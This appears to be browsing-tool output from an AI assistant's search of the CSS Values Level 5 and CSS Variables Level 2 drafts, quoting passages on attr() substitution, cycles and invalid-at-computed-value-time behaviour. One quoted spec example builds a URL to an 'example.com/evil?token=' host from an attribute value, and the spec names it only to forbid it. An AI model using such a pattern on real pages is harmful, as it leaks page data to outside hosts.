"CSS Values and Units Module Level 5 (https://drafts.csswg.org/css-values-5/)\nciteturn1267view0 [wordlim: 200] Crawled: today; Content type: text/html; Source: find({\"ref_id\":\"https://drafts.csswg.org/css-values-5/\",\"pattern\":\"substitute an attr()\"}); Total lines: 2842\nL1049: #### 8.7.1. Substitution\nL1050: \nL1051: cite144†attr() is an cite132†arbitrary substitution function , similar to cite133†var() , and so is replaced with the value it represents (if possible) at cite179†computed value time; otherwise, it’s replaced with the cite175†guaranteed-invalid value , which will make its declaration cite492†invalid at computed-value time .\nL1052: \nL1053: To cite531†replace an attr() function , given a list of `arguments`:\nL1130: While in many cases cite144†attr() with the cite568†<attr-type> set to cite571†<custom-ident> will do, cite715†ident() can be used to construct a <custom-ident> using values that come from other elements. In the following example, the ident() function combines a cite548†custom property defined on a parent with an attr() value coming from the element itself:\nL1131: \nL1132:     .card[id] {\nL1133:       /* E.g. card1, card2, card3, … */\nL1134:       --id: attr(id);\nL1135: \nL1136:       view-transition-name: ident(var(--id));\nL1866: While resolving an attr(foo) function, the value of the foo attribute on the element is fetched and cite177†substituted , with a cite535†substitution context of `«\"attribute\", \"foo\"»`, preventing any nested functions from cyclicly depending on the foo attribute as well.\nL1867: \nL1868: The types of cite535†substitution contexts are currently:\nL1869: \nL1870:   * \"property\", followed by a property name, and optionally a cite774†custom function .\nL1871: \nL1872:   * \"attribute\", followed by an attribute name.\nL2380:   * cite744†<random-item-args> , in § 9.2\nL2381:   * cite129†<random-key> , in § 9.4\nL2382:   * <random-ua-ident>\nL2383:     * cite773†(type) , in § 9.4\nL2384:     * cite1305†value for random(), random-item(), <random-key> , in § 9.4\nL2385:   * cite1306†referrer-policy() , in § 4.1.1\nL2386:   * cite207†<referrer-policy-modifier> , in § 4.1.1\nL2387:   * cite531†replace , in § Unnumbered section\nL2388:   * cite531†replace an arbitrary substitution function , in § Unnumbered section\nL2389:   * cite1307†replace an attr() function , in § 8.7.1\nL2390:   * cite1308†replace an ident() function , in § 8.8\n--------------------------------------------------------------------------------\nCSS Values and Units Module Level 5 (https://drafts.csswg.org/css-values-5/)\nciteturn1267view1 [wordlim: 200] Crawled: today; Content type: text/html; Source: find({\"ref_id\":\"https://drafts.csswg.org/css-values-5/\",\"pattern\":\"invalid at computed-value time\"}); Total lines: 2842\nL805: If none of the arguments represent a valid value for the property, the property is cite492†invalid at computed-value time .\nL806: \nL807: cite491†first-valid() is a cite58†<whole-value> .\nL808: \nL809: Should this have a different name? We didn’t quite decide on it during the resolution to add this.\nL1049: #### 8.7.1. Substitution\nL1050: \nL1051: cite144†attr() is an cite132†arbitrary substitution function , similar to cite133†var() , and so is replaced with the value it represents (if possible) at cite179†computed value time; otherwise, it’s replaced with the cite175†guaranteed-invalid value , which will make its declaration cite492†invalid at computed-value time .\nL1052: \nL1053: To cite531†replace an attr() function , given a list of `arguments`:\nL1086: Using an cite712†attr()-tainted value as or in a cite180†<url> makes a declaration cite492†invalid at computed-value time .\nL1087: \nL1088: For example, all of the following are cite492†invalid at computed-value time :\nL1089: \nL1090:   * cite714†background-image: src(attr(foo)); - can’t use it directly.\nL1091: \nL1092:   * cite714†background-image: image(attr(foo)) - can’t use it in other cite180†<url> -taking functions.\nL1093: \nL1094:   * cite714†background-image: src(string(\"http://example.com/evil?token=\" attr(foo))) - can’t \"launder\" it thru another function.\nL1100: Using cite144†attr() indirectly via a cite548†custom property causes cite712†attr()-tainting of the whole custom property value:\nL1101: \nL1102:   * --foo: image(\"foo.jpg\", attr(bgcolor type(<color>))); background-image: var(--foo); is cite492†invalid at computed-value time .\nL1103: \nL1104: Investigate partial tainting of custom property values.\nL1886: This, finally, is a cite536†cyclic substitution context , since it matches the cite535†substitution context from the first cite177†substitution , causing the substitution to just produce the cite175†guaranteed-invalid value . This percolates back up the nested invocations, eventually resulting in --one becoming cite492†invalid at computed-value time . The same happens, in opposite order, when performing cite537†property replacement on --two.\nL1887: When a cite536†cycle is detected , all participants in the cycle become invalid. For example, all of the following declarations become cite492†invalid at computed-value time .\nL1888: \nL1889:     .foo {\nL1890:       --one: var(--two);\nL1891:       --two: var(--three, baz);\nL1892:       --three: var(--one);\nL1893:     }\nL1894: \nL1895: \nL1896: The presence of a fallback in `var(--three, baz)` does not affect the outcome.\nL1905: This means the following is a valid declaration when the viewport is 600px or wider, resulting in the value cite1070†blue . Only when the viewport is narrower than 600px does the cite121†if() trigger cyclic behavior and cause --color to be cite492†invalid at computed-value time .\nL1906: \nL1907:     .foo {\nL1908:       --color: if(media(width >= 600px): blue; else: var(--color));\nL1909:     }\nL1986: cite132†Arbitrary substitution functions are cite177†substituted during style cite179†computation , before any other value transformations or introspection can occur. If a property, after cite537†property replacement , does not match its declared grammar, the declaration is cite492†invalid at computed-value time .\nL1987: Note: Since cite132†arbitrary substitution functions resolve at cite179†computed value time, if the resulting value after substitution is invalid, the property falls back (essentially) to cite1090†unset behavior, rather than falling back to an earlier value in the cite488†cascade the way declarations invalid at parse time do. See cite85†Invalid Substitution .\nL1988: \nL1989: Tests\nL2000:   * cite1112†whitespace-in-fallback-crash.html†wpt.fyi cite1113†(live test)†wpt.live cite1114†(source)†github.com L2001:   * cite1115†wide-keyword-fallback-001.html†wpt.fyi cite1116†(live test)†wpt.live cite1117†(source)†github.com L2002:   * cite1118†wide-keyword-fallback-002.html†wpt.fyi cite1119†(live test)†wpt.live cite1120†(source)†github.com L2003: For example, the following usage is fine from a syntax standpoint, but results in nonsense when the variable is substituted in:\nL2004: \nL2005:     :root { --looks-valid: 20px; }\nL2006:     p { background-color: var(--looks-valid); }\nL2007: \nL2008: \nL2009: Since 20px is an invalid value for cite1121†background-color , the property becomes cite492†invalid at computed-value time , and instead resolves to cite1122†transparent (the cite1123†initial value for background-color).\nL2010: If the property was one that’s inherited by default, such as cite1124†color , it would compute to the inherited value rather than the initial value.\nL2011: \nL2012: While a cite133†var() function can’t get a cite490†CSS-wide keyword from the cite548†custom property itself—​if you tried to specify that, like --foo: initial;, it would just trigger cite1125†explicit defaulting for the custom property—​it can have a CSS-wide keyword in its fallback:\nL2013: \nL2014:     p { color: var(--does-not-exist, initial); }\nL2015: In the above code, if the --does-not-exist property didn’t exist or is cite492†invalid at computed-value time , the cite133†var() will instead substitute in the cite1126†initial keyword, making the property behave as if it was originally cite1124†color: initial . This will make it take on the document’s initial color value, rather than defaulting to inheritance, as it would if there were no fallback.\nL2016: \nL2017: To replace substitution functions in a property `prop`:\nL2018:   1. cite177†Substitute arbitrary substitution functions in `prop`’s value, given «\"property\", `prop`’s name» as the cite535†substitution context . Let `result` be the returned cite174†component value sequence.\nL2019: \nL2020:   2. If `result` contains the cite175†guaranteed-invalid value , `prop` is cite492†invalid at computed-value time ; return.\nL2021: \nL2022:   3. cite166†Parse `result` according to `prop`’s grammar. If this returns failure, `prop` is cite492†invalid at computed-value time ; return.\nL2023:   4. Otherwise, replace `prop`’s value with the parsed result.\nL2024: \nL2025: Tests\nL2026:   * cite1127†css-variable-change-style-001.html†wpt.fyi cite1128†(live test)†wpt.live cite1129†(source)†github.com L2027:   * cite1130†css-variable-change-style-002.html†wpt.fyi cite1131†(live test)†wpt.live cite1132†(source)†github.com L2028:   * cite1133†variable-declaration-01.html†wpt.fyi cite1134†(live test)†wpt.live cite1135†(source)†github.com L2029:   * cite1136†variable-declaration-02.html†wpt.fyi cite1137†(live test)†wpt.live cite1138†(source)†github.com L2083: ### Invalid Substitution\nL2084: \nL2085: When cite537†property replacement results in a property’s value containing the cite175†guaranteed-invalid value , this makes the declaration invalid at computed-value time. When this happens, the computed value is one of the following depending on the property’s type:\nL2086: \nL2087: The property is a non-registered cite548†custom property L2088: The property is a cite145†registered custom property†drafts.css-houdini.org with cite169†universal syntax†drafts.css-houdini.org L2089: The computed value is the cite175†guaranteed-invalid value .\nL2090: \nL2091: Otherwise\nL2092: \nL2093: \nL2094: Either the property’s inherited value or its initial value depending on whether the property is inherited or not, respectively, as if the property’s value had been specified as the cite1090†unset keyword.\nL2095: \nL2096: Tests\nL2097: \nL2098:   * cite1221†variables-substitute-guaranteed-invalid.html†wpt.fyi cite1222†(live test)†wpt.live cite1223†(source)†github.com L2107: Note the difference between this and what happens if the author had just written cite1121†background-color: 20px directly in their stylesheet - that would be a normal syntax error, which would cause the rule to be discarded, so the background-color: red rule would be used instead.\nL2108: Note: The cite492†invalid at computed-value time concept exists because cite132†arbitrary substitution functions can’t \"fail early\" like other syntax errors can, so by the time the user agent realizes a property value is invalid, it’s already thrown away the other cascaded values.\nL2109: ### Substitution in Shorthand Properties\nL2110: \nL2111: cite132†Arbitrary substitution functions produce some complications when parsing cite547†shorthand properties into their component longhands, and when serializing shorthand properties from their component longhands.\nL2112: If a cite547†shorthand property contains an cite132†arbitrary substitution function in its value, the cite1224†longhand properties it’s associated with must instead be filled in with a special, unobservable-to-authors pending-substitution value that indicates the shorthand contains an arbitrary substitution function, and thus the longhand’s value can’t be determined until after cite177†substituted .\nL2113: This value must then be cascaded as normal, and at computed-value time, after cite177†substitution , the shorthand must be parsed and the longhands must be given their appropriate values at that point.\nL2114: \nL2115: Tests\n--------------------------------------------------------------------------------\nCSS Custom Properties for Cascading Variables Module Level 2 (https://drafts.csswg.org/css-variables-2/)\nciteturn1267view2 [wordlim: 200] Crawled: today; Content type: text/html; Source: find({\"ref_id\":\"https://drafts.csswg.org/css-variables-2/\",\"pattern\":\"invalid at computed-value time\"}); Total lines: 829\nL250: ### 2.2. Guaranteed-Invalid Values\nL251: \nL252: The initial value of a cite47†custom property is a guaranteed-invalid value.\nL253: \nL254: The cite59†guaranteed-invalid value is, well, guaranteed to be invalid. If it ever appears in a property value, then at cite264†computed value time that property becomes cite265†invalid at computed-value time .\nL255: \nL256: Non-property contexts will define their own behavior for the cite59†guaranteed-invalid value , but it will always be \"invalid\" in some sense.\nL553:   * Added concept of \"animation-tainted\", to prevent non-animatable properties from using a variable to smuggle in some animatability.\nL554: \nL555:   * Defined the cite59†guaranteed-invalid value to make the initial value of custom properties and the result of cycles or substitution failure more straightforward, and allow failure to propagate thru substitutions until finally intercepted by a fallback.\nL556: \nL557:   * Defined that cycles trigger cite265†invalid at computed-value time behavior.\nL558:   * Allowed variables to resolve to a CSS-wide keyword (only possible by providing it as a fallback).\nL559: \nL560:   * Clarified that cite219†registered custom properties†drafts.css-houdini.org act like non-custom properties when they’re cite265†invalid at computed-value time .\nL561: \nL562:   * Made longhands with cite48†var() s also trigger their shorthands to be unserializable, like longhands with pending-substitution values already did.\nL563: \nL564:   * Required UAs to defend against exponential substitution attacks.\nL565:   * Defined how to serialize the values of custom properties (previously, only the property name’s serialization was specified).\nL764:     * arbitrary substitution function\nL765:     * argument grammar\nL766:     * cyclic substitution contexts\nL767:     * invalid at computed-value time\nL768:     * property replacement\nL769:     * resolve an arbitrary substitution function\nL770:     * substitute arbitrary substitution function\nL771:     * substitution context\nL772:   * [CSSOM-1] defines the following terms:\nL773:     * case-sensitive flag\nL774:     * declarations\nL775:     * getPropertyValue(property)\nL776:   * [INFRA] defines the following terms:\nL777:     * ASCII case-insensitive\nL778:     * identical to\n"
